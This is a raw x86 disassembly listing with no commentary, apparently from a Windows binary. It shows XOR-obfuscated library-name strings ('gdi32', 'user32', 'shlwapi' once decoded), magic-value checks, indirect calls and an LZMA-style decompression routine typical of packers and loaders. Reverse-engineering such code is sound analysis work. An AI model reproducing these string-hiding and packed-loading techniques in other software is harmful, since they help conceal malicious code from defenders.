  41faab:	dec    ecx
  41faac:	mov    dh,0xa3
  41faae:	push   eax
  41faaf:	dec    ecx
  41fab0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fab1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fab2:	enter  0x128,0x0
  41fab6:	add    BYTE PTR [eax],al
  41fab8:	inc    ebx
  41fab9:	cmp    bl,BYTE PTR [esi+eax*2+0x6f]
  41fabd:	ins    BYTE PTR es:[edi],dx
  41fabe:	fs gs jb 0x41fae2
  41fac2:	outs   dx,DWORD PTR ds:[esi]
  41fac3:	data16 and BYTE PTR [edi+0x6f],dl
  41fac7:	jb     0x41fb34
  41fac9:	imul   ebp,DWORD PTR [esi+0x67],0x6f725020
  41fad0:	push   0x65
  41fad2:	arpl   WORD PTR [esp+ebx*2+0x50],si
  41fad6:	jb     0x41fb47
  41fad8:	push   0x65
  41fada:	arpl   WORD PTR [esp+edx*2+0x65],si
  41fade:	jae    0x41fb54
  41fae0:	add    BYTE PTR [ebx-0x137e13ab],cl
  41fae6:	or     BYTE PTR [ecx],al
  41fae8:	add    BYTE PTR [eax],al
  41faea:	push   ebx
  41faeb:	mov    eax,ebx
  41faed:	xchg   ecx,eax
  41faee:	mov    eax,DWORD PTR [ebp+0x8]
  41faf1:	cmp    eax,0xf89c85b5
  41faf6:	jne    0x41ff8a
  41fafc:	mov    eax,DWORD PTR [ebp+0xc]
  41faff:	cmp    eax,0xf89c85b4
  41fb04:	jne    0x41ff8a
  41fb0a:	mov    eax,DWORD PTR [ebp+0x24]
  41fb0d:	mov    DWORD PTR [ebp-0x4],eax
  41fb10:	mov    eax,DWORD PTR [ebp-0x4]
  41fb13:	mov    eax,DWORD PTR [eax+0x1d8]
  41fb19:	mov    eax,DWORD PTR [eax]
  41fb1b:	mov    eax,DWORD PTR [eax]
  41fb1d:	mov    DWORD PTR [ebp-0x8],eax
  41fb20:	mov    BYTE PTR [ebp-0x18],0xe0
  41fb24:	mov    BYTE PTR [ebp-0x17],0xdf
  41fb28:	mov    BYTE PTR [ebp-0x16],0xe2
  41fb2c:	mov    BYTE PTR [ebp-0x15],0xac
  41fb30:	mov    BYTE PTR [ebp-0x14],0xad
  41fb34:	mov    BYTE PTR [ebp-0x13],0x7b
  41fb38:	mov    BYTE PTR [ebp-0x20],0xee
  41fb3c:	mov    BYTE PTR [ebp-0x1f],0xec
  41fb40:	mov    BYTE PTR [ebp-0x1e],0xde
  41fb44:	mov    BYTE PTR [ebp-0x1d],0xed
  41fb48:	mov    BYTE PTR [ebp-0x1c],0xac
  41fb4c:	mov    BYTE PTR [ebp-0x1b],0xad
  41fb50:	mov    BYTE PTR [ebp-0x1a],0x7b
  41fb54:	mov    BYTE PTR [ebp-0x28],0xec
  41fb58:	mov    BYTE PTR [ebp-0x27],0xe3
  41fb5c:	mov    BYTE PTR [ebp-0x26],0xe7
  41fb60:	mov    BYTE PTR [ebp-0x25],0xf0
  41fb64:	mov    BYTE PTR [ebp-0x24],0xda
  41fb68:	mov    BYTE PTR [ebp-0x23],0xeb
  41fb6c:	mov    BYTE PTR [ebp-0x22],0xe2
  41fb70:	mov    BYTE PTR [ebp-0x21],0x7b
  41fb74:	xor    ecx,ecx
  41fb76:	lea    eax,[ebp+ecx*1-0x18]
  41fb7a:	movzx  edx,BYTE PTR [eax]
  41fb7d:	xor    edx,0x81
  41fb83:	add    edx,0x6
  41fb86:	inc    ecx
  41fb87:	mov    BYTE PTR [eax],dl
  41fb89:	cmp    ecx,0x6
  41fb8c:	jb     0x41fb76
  41fb8e:	xor    ecx,ecx
  41fb90:	lea    eax,[ebp+ecx*1-0x20]
  41fb94:	movzx  edx,BYTE PTR [eax]
  41fb97:	xor    edx,0x81
  41fb9d:	add    edx,0x6
  41fba0:	inc    ecx
  41fba1:	mov    BYTE PTR [eax],dl
  41fba3:	cmp    ecx,0x7
  41fba6:	jb     0x41fb90
  41fba8:	xor    ecx,ecx
  41fbaa:	lea    eax,[ebp+ecx*1-0x28]
  41fbae:	movzx  edx,BYTE PTR [eax]
  41fbb1:	xor    edx,0x81
  41fbb7:	add    edx,0x6
  41fbba:	inc    ecx
  41fbbb:	mov    BYTE PTR [eax],dl
  41fbbd:	cmp    ecx,0x8
  41fbc0:	jb     0x41fbaa
  41fbc2:	lea    eax,[ebp-0x2c]
  41fbc5:	mov    DWORD PTR [ebp-0x8],eax
  41fbc8:	mov    ecx,DWORD PTR [ebp-0x8]
  41fbcb:	mov    eax,0x7113fcef
  41fbd0:	push   esi
  41fbd1:	mov    DWORD PTR [ecx],eax
  41fbd3:	mov    ecx,DWORD PTR [ebp-0x2c]
  41fbd6:	mov    esi,0x4e3c
  41fbdb:	push   edi
  41fbdc:	lea    edi,[esi-0x2]
  41fbdf:	mov    ebx,0x3272fa
  41fbe4:	cmp    ecx,eax
  41fbe6:	jne    0x41fcb7
  41fbec:	lea    eax,[esi+0x3b]
  41fbef:	mov    WORD PTR [ebp-0x78],ax
  41fbf3:	mov    eax,esi
  41fbf5:	mov    WORD PTR [ebp-0x76],ax
  41fbf9:	add    eax,0x3d
  41fbfc:	mov    WORD PTR [ebp-0x74],ax
  41fc00:	lea    eax,[esi+0x2]
  41fc03:	mov    WORD PTR [ebp-0x72],ax
  41fc07:	add    eax,0x41
  41fc0a:	mov    WORD PTR [ebp-0x70],ax
  41fc0e:	mov    eax,edi
  41fc10:	mov    WORD PTR [ebp-0x6e],ax
  41fc14:	mov    eax,0x4f90
  41fc19:	mov    WORD PTR [ebp-0x6c],ax
  41fc1d:	lea    eax,[esi-0x7]
  41fc20:	mov    WORD PTR [ebp-0x6a],ax
  41fc24:	add    eax,0x30
  41fc27:	mov    WORD PTR [ebp-0x68],ax
  41fc2b:	lea    eax,[esi-0xb]
  41fc2e:	mov    WORD PTR [ebp-0x66],ax
  41fc32:	mov    eax,esi
  41fc34:	mov    WORD PTR [ebp-0x64],ax
  41fc38:	add    eax,0xfffffff4
  41fc3b:	mov    WORD PTR [ebp-0x62],ax
  41fc3f:	mov    eax,0x44b
  41fc44:	mov    WORD PTR [ebp-0x60],ax
  41fc48:	mov    eax,0x567a
  41fc4d:	mov    WORD PTR [ebp-0x5e],ax
  41fc51:	mov    eax,0x611a
  41fc56:	mov    WORD PTR [ebp-0x5c],ax
  41fc5a:	mov    eax,0xf1e4
  41fc5f:	mov    WORD PTR [ebp-0x5a],ax
  41fc63:	mov    eax,edi
  41fc65:	mov    WORD PTR [ebp-0x58],ax
  41fc69:	lea    eax,[ebp-0xe0]
  41fc6f:	push   eax
  41fc70:	mov    eax,DWORD PTR [ebp+0xc]
  41fc73:	xor    eax,0x75108b3
  41fc78:	add    eax,ebx
  41fc7a:	push   eax
  41fc7b:	lea    eax,[ebp-0x78]
  41fc7e:	push   eax
  41fc7f:	mov    eax,DWORD PTR [ebp-0x4]
  41fc82:	mov    eax,DWORD PTR [eax+0x198]
  41fc88:	mov    DWORD PTR [ebp-0xe0],0x1
  41fc92:	mov    DWORD PTR [ebp-0xdc],0xffff
  41fc9c:	push   DWORD PTR [eax]
  41fc9e:	mov    eax,DWORD PTR [ebp+0x10]
  41fca1:	call   eax
  41fca3:	mov    DWORD PTR [ebp-0x8],eax
  41fca6:	mov    eax,DWORD PTR [ebp-0x8]
  41fca9:	test   eax,eax
  41fcab:	je     0x41fcb7
  41fcad:	xor    DWORD PTR ds:0xe041cd9,0x9f170bc8
  41fcb7:	mov    eax,DWORD PTR [ebp-0x4]
  41fcba:	mov    ecx,DWORD PTR [eax+0x18c]
  41fcc0:	xor    eax,eax
  41fcc2:	cmp    DWORD PTR [ecx],eax
  41fcc4:	jne    0x41fefa
  41fcca:	mov    ecx,DWORD PTR [ebp-0x4]
  41fccd:	mov    ecx,DWORD PTR [ecx+0x17c]
  41fcd3:	mov    DWORD PTR [ecx],eax
  41fcd5:	mov    ecx,DWORD PTR [ebp-0x4]
  41fcd8:	mov    ecx,DWORD PTR [ecx+0x180]
  41fcde:	mov    DWORD PTR [ecx],eax
  41fce0:	mov    eax,0x4e69
  41fce5:	mov    WORD PTR [ebp-0x9c],ax
  41fcec:	mov    eax,esi
  41fcee:	mov    WORD PTR [ebp-0x9a],ax
  41fcf5:	mov    eax,0x4e79
  41fcfa:	mov    WORD PTR [ebp-0x98],ax
  41fd01:	add    eax,0xffffffc0
  41fd04:	mov    WORD PTR [ebp-0x96],ax
  41fd0b:	mov    eax,0x4f8c
  41fd10:	mov    WORD PTR [ebp-0x94],ax
  41fd17:	mov    eax,0x4e38
  41fd1c:	mov    WORD PTR [ebp-0x92],ax
  41fd23:	mov    eax,esi
  41fd25:	mov    WORD PTR [ebp-0x8c],ax
  41fd2c:	mov    eax,0x4e35
  41fd31:	mov    WORD PTR [ebp-0x8a],ax
  41fd38:	mov    eax,0x99f9
  41fd3d:	mov    WORD PTR [ebp-0x88],ax
  41fd44:	mov    eax,0x8d68
  41fd49:	mov    WORD PTR [ebp-0x86],ax
  41fd50:	mov    eax,0xd66f
  41fd55:	mov    WORD PTR [ebp-0x84],ax
  41fd5c:	mov    BYTE PTR [ebp-0x10],0xec
  41fd60:	mov    eax,0xd78b
  41fd65:	mov    WORD PTR [ebp-0x82],ax
  41fd6c:	mov    BYTE PTR [ebp-0xf],0xe3
  41fd70:	mov    eax,0x278a
  41fd75:	mov    BYTE PTR [ebp-0xe],0xe7
  41fd79:	mov    WORD PTR [ebp-0x80],ax
  41fd7d:	mov    BYTE PTR [ebp-0xd],0xf0
  41fd81:	mov    eax,0x478a
  41fd86:	mov    BYTE PTR [ebp-0xc],0xda
  41fd8a:	mov    WORD PTR [ebp-0x7e],ax
  41fd8e:	mov    eax,0x4e3b
  41fd93:	mov    BYTE PTR [ebp-0xb],0xeb
  41fd97:	push   0x8
  41fd99:	mov    BYTE PTR [ebp-0xa],0xe2
  41fd9d:	mov    WORD PTR [ebp-0x7c],ax
  41fda1:	mov    BYTE PTR [ebp-0x9],0x7b
  41fda5:	mov    DWORD PTR [ebp-0x90],0x4e3a4e65
  41fdaf:	lea    eax,[ebp-0x10]
  41fdb2:	pop    edi
  41fdb3:	movzx  ecx,BYTE PTR [eax]
  41fdb6:	xor    ecx,0x81
  41fdbc:	add    ecx,0x6
  41fdbf:	mov    BYTE PTR [eax],cl
  41fdc1:	inc    eax
  41fdc2:	dec    edi
  41fdc3:	jne    0x41fdb3
  41fdc5:	mov    DWORD PTR [ebp-0xe0],0x1
  41fdcf:	lea    eax,[ebp-0x10]
  41fdd2:	mov    DWORD PTR [ebp-0xdc],eax
  41fdd8:	mov    ecx,0x4e64
  41fddd:	mov    eax,ecx
  41fddf:	mov    WORD PTR [ebp-0x40],ax
  41fde3:	add    eax,0xf
  41fde6:	mov    edx,eax
  41fde8:	mov    WORD PTR [ebp-0x3e],dx
  41fdec:	mov    edx,0x4f9b
  41fdf1:	mov    WORD PTR [ebp-0x3c],dx
  41fdf5:	add    edx,0xfffffff8
  41fdf8:	mov    WORD PTR [ebp-0x3a],dx
  41fdfc:	mov    edx,0x4f8d
  41fe01:	mov    WORD PTR [ebp-0x38],dx
  41fe05:	inc    edx
  41fe06:	mov    WORD PTR [ebp-0x36],dx
  41fe0a:	mov    edx,0x4f87
  41fe0f:	mov    WORD PTR [ebp-0x34],dx
  41fe13:	mov    WORD PTR [ebp-0x32],cx
  41fe17:	mov    ecx,esi
  41fe19:	mov    WORD PTR [ebp-0x30],cx
  41fe1d:	lea    ecx,[edx-0x3]
  41fe20:	mov    edx,ecx
  41fe22:	mov    WORD PTR [ebp-0x54],dx
  41fe26:	mov    edx,eax
  41fe28:	mov    WORD PTR [ebp-0x52],dx
  41fe2c:	mov    edx,0x4e7b
  41fe31:	mov    WORD PTR [ebp-0x50],dx
  41fe35:	mov    WORD PTR [ebp-0x4e],ax
  41fe39:	lea    eax,[edx-0xe]
  41fe3c:	mov    WORD PTR [ebp-0x4c],ax
  41fe40:	inc    eax
  41fe41:	mov    WORD PTR [ebp-0x4a],ax
  41fe45:	lea    eax,[edx-0x14]
  41fe48:	mov    WORD PTR [ebp-0x48],ax
  41fe4c:	mov    WORD PTR [ebp-0x46],cx
  41fe50:	mov    WORD PTR [ebp-0x44],si
  41fe54:	mov    ecx,DWORD PTR [ebp+0x8]
  41fe57:	movzx  edx,WORD PTR [ebp-0x54]
  41fe5b:	mov    eax,0x75108b3
  41fe60:	xor    ecx,eax
  41fe62:	add    ecx,ebx
  41fe64:	xor    ecx,edx
  41fe66:	mov    WORD PTR [ebp-0x54],cx
  41fe6a:	mov    ecx,DWORD PTR [ebp+0x8]
  41fe6d:	xor    ecx,eax
  41fe6f:	movzx  eax,WORD PTR [ebp-0x40]
  41fe73:	add    ecx,ebx
  41fe75:	xor    ecx,eax
  41fe77:	xor    eax,eax
  41fe79:	mov    WORD PTR [ebp-0x40],cx
  41fe7d:	mov    WORD PTR [ebp-0xf4],ax
  41fe84:	mov    WORD PTR [ebp-0x108],ax
  41fe8b:	mov    edi,DWORD PTR [ebp+0x24]
  41fe8e:	lea    eax,[ebp-0xf4]
  41fe94:	lea    edx,[ebp-0x54]
  41fe97:	mov    DWORD PTR [ebp-0xe0],0x2
  41fea1:	mov    DWORD PTR [ebp-0xdc],eax
  41fea7:	call   0x4228e9
  41feac:	mov    ecx,DWORD PTR [ebp+0x8]
  41feaf:	mov    DWORD PTR [ebp-0xd8],eax
  41feb5:	mov    eax,0x75108b3
  41feba:	xor    ecx,eax
  41febc:	add    ecx,ebx
  41febe:	je     0x41fedd
  41fec0:	lea    ecx,[ebp-0xe0]
  41fec6:	push   ecx
  41fec7:	mov    ecx,DWORD PTR [ebp+0xc]
  41feca:	xor    ecx,eax
  41fecc:	add    ecx,ebx
  41fece:	push   ecx
  41fecf:	lea    eax,[ebp-0x9c]
  41fed5:	push   eax
  41fed6:	mov    eax,DWORD PTR [ebp+0x10]
  41fed9:	push   0x0
  41fedb:	call   eax
  41fedd:	mov    edi,DWORD PTR [ebp+0x24]
  41fee0:	lea    eax,[ebp-0x108]
  41fee6:	lea    edx,[ebp-0x40]
  41fee9:	mov    DWORD PTR [ebp-0xdc],eax
  41feef:	call   0x4228e9
  41fef4:	mov    DWORD PTR [ebp-0xd8],eax
  41fefa:	mov    eax,DWORD PTR [ebp+0x14]
  41fefd:	push   DWORD PTR [ebp-0x4]
  41ff00:	push   DWORD PTR [ebp+0x20]
  41ff03:	push   DWORD PTR [ebp+0x1c]
  41ff06:	push   DWORD PTR [ebp+0x18]
  41ff09:	push   DWORD PTR [ebp+0x10]
  41ff0c:	push   DWORD PTR [ebp+0x8]
  41ff0f:	push   DWORD PTR [ebp+0xc]
  41ff12:	call   0x42118a
  41ff17:	test   eax,eax
  41ff19:	je     0x41ff60
  41ff1b:	add    DWORD PTR [ebp-0x4],eax
  41ff1e:	push   DWORD PTR [ebp-0x4]
  41ff21:	lea    esi,[ebp+0x4]
  41ff24:	call   0x420378
  41ff29:	mov    eax,DWORD PTR [ebp-0x4]
  41ff2c:	mov    eax,DWORD PTR [eax+0x1c8]
  41ff32:	mov    eax,DWORD PTR [eax]
  41ff34:	xor    eax,0x75108b3
  41ff39:	add    eax,ebx
  41ff3b:	mov    eax,DWORD PTR [ebp-0x4]
  41ff3e:	jne    0x41ff56
  41ff40:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff43:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41ff49:	push   DWORD PTR [ecx]
  41ff4b:	mov    eax,DWORD PTR [eax+0x1e0]
  41ff51:	call   DWORD PTR [eax+0x28]
  41ff54:	jmp    0x41ff60
  41ff56:	mov    eax,DWORD PTR [eax+0x17c]
  41ff5c:	mov    eax,DWORD PTR [eax]
  41ff5e:	add    DWORD PTR [esi],eax
  41ff60:	mov    eax,DWORD PTR [ebp-0x4]
  41ff63:	mov    eax,DWORD PTR [eax+0x1dc]
  41ff69:	dec    DWORD PTR [eax]
  41ff6b:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff6e:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41ff74:	mov    eax,DWORD PTR [eax]
  41ff76:	lea    eax,[ecx+eax*4]
  41ff79:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff7c:	mov    ecx,DWORD PTR [ecx+0x17c]
  41ff82:	mov    eax,DWORD PTR [eax]
  41ff84:	mov    ecx,DWORD PTR [ecx]
  41ff86:	add    DWORD PTR [eax],ecx
  41ff88:	pop    edi
  41ff89:	pop    esi
  41ff8a:	pop    ebx
  41ff8b:	leave  
  41ff8c:	ret    0x20
  41ff8f:	push   edi
  41ff90:	push   esi
  41ff91:	push   ebx
  41ff92:	push   ebp
  41ff93:	mov    ebp,esp
  41ff95:	mov    eax,DWORD PTR [ebp+0x24]
  41ff98:	add    DWORD PTR [ebp+0x28],eax
  41ff9b:	push   eax
  41ff9c:	cld    
  41ff9d:	mov    esi,DWORD PTR [ebp+0x18]
  41ffa0:	add    DWORD PTR [ebp+0x1c],esi
  41ffa3:	push   esi
  41ffa4:	mov    esi,DWORD PTR [ebp+0x14]
  41ffa7:	lods   eax,DWORD PTR ds:[esi]
  41ffa8:	xchg   edx,eax
  41ffa9:	push   edx
  41ffaa:	mov    cl,BYTE PTR [esi-0x2]
  41ffad:	or     eax,0xffffffff
  41ffb0:	shl    eax,cl
  41ffb2:	not    eax
  41ffb4:	push   eax
  41ffb5:	mov    cl,dh
  41ffb7:	or     eax,0xffffffff
  41ffba:	shl    eax,cl
  41ffbc:	not    eax
  41ffbe:	push   eax
  41ffbf:	add    cl,dl
  41ffc1:	mov    edi,esi
  41ffc3:	sub    esp,0xc
  41ffc6:	sub    eax,eax
  41ffc8:	inc    eax
  41ffc9:	push   eax
  41ffca:	push   eax
  41ffcb:	push   eax
  41ffcc:	push   eax
  41ffcd:	push   eax
  41ffce:	push   edi
  41ffcf:	sub    esi,esi
  41ffd1:	push   esi
  41ffd2:	or     ebx,0xffffffff
  41ffd5:	mov    eax,0x300
  41ffda:	shl    eax,cl
  41ffdc:	lea    ecx,[eax+0x736]
  41ffe2:	mov    eax,0x4000400
  41ffe7:	shr    ecx,1
  41ffe9:	rep stos DWORD PTR es:[edi],eax
  41ffeb:	push   0x5
  41ffed:	pop    ecx
  41ffee:	call   0x4202d9
  41fff3:	loop   0x41ffee
  41fff5:	lea    esi,[esi]
  41fff7:	lea    edi,[edi]
  41fff9:	mov    edi,DWORD PTR [ebp-0x4]
  41fffc:	mov    eax,DWORD PTR [ebp-0x10]
  41ffff:	sub    edi,DWORD PTR [ebp+0x24]
  420002:	and    eax,edi
  420004:	mov    DWORD PTR [ebp-0x18],eax
  420007:	mov    al,0x0
  420009:	call   0x4202f1
  42000e:	jne    0x4200a9
  420014:	mov    cl,BYTE PTR [ebp-0xc]
  420017:	and    edi,DWORD PTR [ebp-0x14]
  42001a:	shl    edi,cl
  42001c:	sub    cl,0x8
  42001f:	neg    cl
  420021:	shr    esi,cl
  420023:	pop    eax
  420024:	add    edi,esi
  420026:	pop    esi
  420027:	lea    edi,[edi+edi*2]
  42002a:	shl    edi,0x8
  42002d:	cmp    al,0x7
  42002f:	pop    edx
  420030:	lea    ecx,[esi+edi*2+0xe6c]
  420037:	push   ecx
  420038:	push   esi
  420039:	mov    esi,0x100
  42003e:	push   eax
  42003f:	mov    al,0x1
  420041:	jb     0x420077
  420043:	mov    edi,DWORD PTR [ebp-0x4]
  420046:	sub    edi,DWORD PTR [ebp-0x24]
  420049:	movzx  edi,BYTE PTR [edi]
  42004c:	mov    ebp,DWORD PTR [ebp-0x34]
  42004f:	shl    edi,1
  420051:	mov    ecx,esi
  420053:	and    esi,edi
  420055:	add    ecx,esi
  420057:	lea    ebp,[ebp+ecx*2+0x0]
  42005b:	call   0x420310
  420060:	mov    ecx,eax
  420062:	shr    esi,0x8
  420065:	and    ecx,0x1
  420068:	cmp    esi,ecx
  42006a:	mov    esi,0x100
  42006f:	jne    0x42007f
  420071:	cmp    eax,esi
  420073:	jb     0x42004c
  420075:	jmp    0x42008b
  420077:	mov    ebp,DWORD PTR [ebp-0x34]
  42007a:	call   0x420310
  42007f:	inc    eax
  420080:	inc    esi
  420081:	sub    eax,0x1
  420084:	sub    esi,0x1
  420087:	cmp    eax,esi
  420089:	jb     0x420077
  42008b:	pop    edx
  42008c:	inc    edx
  42008d:	cmp    edx,0x5
  420090:	dec    edx
  420091:	mov    ecx,edx
  420093:	jb     0x4200a4
  420095:	inc    edx
  420096:	cmp    edx,0xb
  420099:	dec    edx
  42009a:	mov    cl,0x4
  42009c:	dec    cl
  42009e:	jb     0x4200a4
  4200a0:	mov    cl,0x7
  4200a2:	dec    cl
  4200a4:	sub    edx,ecx
  4200a6:	push   edx
  4200a7:	jmp    0x4200f8
  4200a9:	mov    al,0xc1
  4200ab:	dec    al
  4200ad:	call   0x420301
  4200b2:	jne    0x4200c8
  4200b4:	pop    eax
  4200b5:	pop    edi
  4200b6:	pop    edx
  4200b7:	pop    ecx
  4200b8:	pop    edx
  4200b9:	pop    ecx
  4200ba:	push   DWORD PTR [esp]
  4200bd:	push   ecx
  4200be:	push   edx
  4200bf:	mov    edx,0x664
  4200c4:	mov    cl,0x0
  4200c6:	jmp    0x42013b
  4200c8:	mov    al,0xcd
  4200ca:	dec    al
  4200cc:	call   0x420301
  4200d1:	jne    0x420101
  4200d3:	mov    al,0xf1
  4200d5:	dec    al
  4200d7:	call   0x4202f1
  4200dc:	jne    0x420131
  4200de:	pop    eax
  4200df:	cmp    al,0x7
  4200e1:	mov    al,0x9
  4200e3:	jb     0x4200e7
  4200e5:	mov    al,0xb
  4200e7:	push   eax
  4200e8:	mov    esi,DWORD PTR [ebp-0x4]
  4200eb:	sub    esi,DWORD PTR [ebp-0x24]
  4200ee:	cmp    esi,DWORD PTR [ebp+0x24]
  4200f1:	jb     0x4202c8
  4200f7:	lods   al,BYTE PTR ds:[esi]
  4200f8:	mov    edi,DWORD PTR [ebp-0x4]
  4200fb:	stos   BYTE PTR es:[edi],al
  4200fc:	jmp    0x42028f
  420101:	mov    al,0xd8
  420103:	call   0x420301
  420108:	mov    esi,DWORD PTR [ebp-0x28]
  42010b:	je     0x420128
  42010d:	mov    al,0xe4
  42010f:	call   0x420301
  420114:	mov    esi,DWORD PTR [ebp-0x2c]
  420117:	je     0x420122
  420119:	mov    esi,DWORD PTR [ebp-0x30]
  42011c:	mov    ecx,DWORD PTR [ebp-0x2c]
  42011f:	mov    DWORD PTR [ebp-0x30],ecx
  420122:	mov    ecx,DWORD PTR [ebp-0x28]
  420125:	mov    DWORD PTR [ebp-0x2c],ecx
  420128:	mov    ecx,DWORD PTR [ebp-0x24]
  42012b:	mov    DWORD PTR [ebp-0x28],ecx
  42012e:	mov    DWORD PTR [ebp-0x24],esi
  420131:	pop    eax
  420132:	pop    edi
  420133:	pop    ecx
  420134:	mov    edx,0xa68
  420139:	mov    cl,0x8
  42013b:	add    edx,edi
  42013d:	push   edx
  42013e:	push   edi
  42013f:	cmp    al,0x7
  420141:	mov    al,cl
  420143:	jb     0x420147
  420145:	add    al,0x3
  420147:	push   eax
  420148:	mov    ebp,DWORD PTR [ebp-0x34]
  42014b:	call   0x42030e
  420150:	jne    0x420166
  420152:	mov    eax,DWORD PTR [ebp-0x18]
  420155:	mov    edi,DWORD PTR [ebp-0x34]
  420158:	shl    eax,0x3
  42015b:	sub    ecx,ecx
  42015d:	push   0x8
  42015f:	pop    esi
  420160:	lea    edi,[edi+eax*2+0x4]
  420164:	jmp    0x42019b
  420166:	mov    ebp,DWORD PTR [ebp-0x34]
  420169:	add    ebp,0x2
  42016c:	call   0x42030e
  420171:	jne    0x42018b
  420173:	mov    eax,DWORD PTR [ebp-0x18]
  420176:	mov    edi,DWORD PTR [ebp-0x34]
  420179:	shl    eax,0x3
  42017c:	push   0x8
  42017e:	pop    ecx
  42017f:	push   0x8
  420181:	pop    esi
  420182:	lea    edi,[edi+eax*2+0x104]
  420189:	jmp    0x42019b
  42018b:	mov    edi,0x204
  420190:	add    edi,DWORD PTR [ebp-0x34]
  420193:	push   0x10
  420195:	pop    ecx
  420196:	mov    esi,0x100
  42019b:	mov    DWORD PTR [ebp-0x1c],ecx
  42019e:	sub    eax,eax
  4201a0:	inc    eax
  4201a1:	mov    ebp,edi
  4201a3:	call   0x420310
  4201a8:	mov    ecx,eax
  4201aa:	sub    ecx,esi
  4201ac:	jb     0x4201a1
  4201ae:	add    DWORD PTR [ebp-0x1c],ecx
  4201b1:	cmp    DWORD PTR [ebp-0x3c],0x4
  4201b5:	jae    0x42026b
  4201bb:	add    DWORD PTR [ebp-0x3c],0x7
  4201bf:	mov    ecx,DWORD PTR [ebp-0x1c]
  4201c2:	cmp    ecx,0x4
  4201c5:	jb     0x4201ca
  4201c7:	push   0x3
  4201c9:	pop    ecx
  4201ca:	mov    edi,DWORD PTR [ebp-0x38]
  4201cd:	shl    ecx,0x6
  4201d0:	sub    eax,eax
  4201d2:	inc    eax
  4201d3:	push   0x40
  4201d5:	pop    esi
  4201d6:	lea    edi,[edi+ecx*2+0x360]
  4201dd:	mov    ebp,edi
  4201df:	call   0x420310
  4201e4:	mov    ecx,eax
  4201e6:	sub    ecx,esi
  4201e8:	jb     0x4201dd
  4201ea:	mov    DWORD PTR [ebp-0x18],ecx
  4201ed:	mov    DWORD PTR [ebp-0x24],ecx
  4201f0:	cmp    ecx,0x4
  4201f3:	jb     0x420268
  4201f5:	mov    esi,ecx
  4201f7:	and    DWORD PTR [ebp-0x24],0x1
  4201fb:	shr    esi,1
  4201fd:	or     DWORD PTR [ebp-0x24],0x2
  420201:	dec    esi
  420202:	cmp    ecx,0xe
  420205:	jae    0x420220
  420207:	mov    eax,0x2af
  42020c:	sub    eax,ecx
  42020e:	mov    ecx,esi
  420210:	shl    BYTE PTR [ebp-0x24],cl
  420213:	add    eax,DWORD PTR [ebp-0x24]
  420216:	shl    eax,1
  420218:	add    eax,DWORD PTR [ebp-0x38]
  42021b:	mov    DWORD PTR [ebp-0x34],eax
  42021e:	jmp    0x42024d
  420220:	sub    esi,0x4
  420223:	call   0x4202cd
  420228:	shr    ebx,1
  42022a:	shl    DWORD PTR [ebp-0x24],1
  42022d:	cmp    DWORD PTR [ebp-0x20],ebx
  420230:	jb     0x420238
  420232:	inc    DWORD PTR [ebp-0x24]
  420235:	sub    DWORD PTR [ebp-0x20],ebx
  420238:	dec    esi
  420239:	jne    0x420223
  42023b:	mov    eax,0x644
  420240:	add    eax,DWORD PTR [ebp-0x38]
  420243:	mov    DWORD PTR [ebp-0x34],eax
  420246:	shl    DWORD PTR [ebp-0x24],0x4
  42024a:	push   0x4
  42024c:	pop    esi
  42024d:	sub    edi,edi
  42024f:	inc    edi
  420250:	mov    eax,edi
  420252:	mov    ebp,DWORD PTR [ebp-0x34]
  420255:	call   0x420310
  42025a:	test   al,0x1
  42025c:	je     0x420261
  42025e:	or     DWORD PTR [ebp-0x24],edi
  420261:	shl    edi,1
  420263:	dec    esi
  420264:	jne    0x420252
  420266:	jmp    0x420268
  420268:	inc    DWORD PTR [ebp-0x24]
  42026b:	mov    ecx,DWORD PTR [ebp-0x1c]
  42026e:	add    ecx,0x2
  420271:	mov    edi,DWORD PTR [ebp-0x4]
  420274:	mov    eax,edi
  420276:	sub    eax,DWORD PTR [ebp+0x24]
  420279:	cmp    DWORD PTR [ebp-0x24],eax
  42027c:	ja     0x4202c8
  42027e:	mov    esi,edi
  420280:	sub    esi,DWORD PTR [ebp-0x24]
  420283:	mov    edx,DWORD PTR [ebp+0x28]
  420286:	lods   al,BYTE PTR ds:[esi]
  420287:	stos   BYTE PTR es:[edi],al
  420288:	cmp    edi,edx
  42028a:	jae    0x42028f
  42028c:	dec    ecx
  42028d:	jne    0x420286
  42028f:	mov    DWORD PTR [ebp-0x4],edi
  420292:	movzx  esi,al
  420295:	cmp    edi,DWORD PTR [ebp+0x28]
  420298:	jb     0x41fff9
  42029e:	call   0x4202cd
  4202a3:	sub    eax,eax
  4202a5:	lea    ebp,[esp+0x3c]
  4202a9:	mov    edx,DWORD PTR [ebp+0x20]
  4202ac:	mov    esi,DWORD PTR [ebp-0x8]
  4202af:	sub    esi,DWORD PTR [ebp+0x18]
  4202b2:	mov    DWORD PTR [edx],esi
  4202b4:	mov    edx,DWORD PTR [ebp+0x2c]
  4202b7:	mov    edi,DWORD PTR [ebp-0x4]
  4202ba:	sub    edi,DWORD PTR [ebp+0x24]
  4202bd:	mov    DWORD PTR [edx],edi
  4202bf:	leave  
  4202c0:	pop    ebx
  4202c1:	pop    esi
  4202c2:	pop    edi
  4202c3:	ret    0x1c
  4202c6:	pop    esi
  4202c7:	pop    eax
  4202c8:	sub    eax,eax
  4202ca:	inc    eax
  4202cb:	jmp    0x4202a5
  4202cd:	cmp    ebx,0x1000000
  4202d3:	jb     0x4202d6
  4202d5:	ret    
  4202d6:	shl    ebx,0x8
  4202d9:	push   esi
  4202da:	mov    esi,DWORD PTR [ebp-0x8]
  4202dd:	cmp    esi,DWORD PTR [ebp+0x1c]
  4202e0:	jae    0x4202c6
  4202e2:	mov    ecx,0xe920ea0
  4202e7:	stos   DWORD PTR es:[edi],eax
  4202e8:	cmp    eax,0xb10ea0b1
  4202ed:	pusha  
  4202ee:	outs   dx,BYTE PTR ds:[esi]
  4202ef:	add    al,0x9a
  4202f1:	mov    ecx,0x65c79ec0
  4202f6:	mov    ss,WORD PTR [edx-0x5f6864ee]
  4202fc:	cs xchg edi,eax
  4202fe:	xchg   edx,eax
  4202ff:	cmp    ah,BYTE PTR [ebx-0x68719a39]
  420305:	mov    al,ds:0xae40b99e
  42030a:	sar    DWORD PTR [eax+eiz*4],0x8b
  42030e:	aaa    
  42030f:	mov    es,ecx
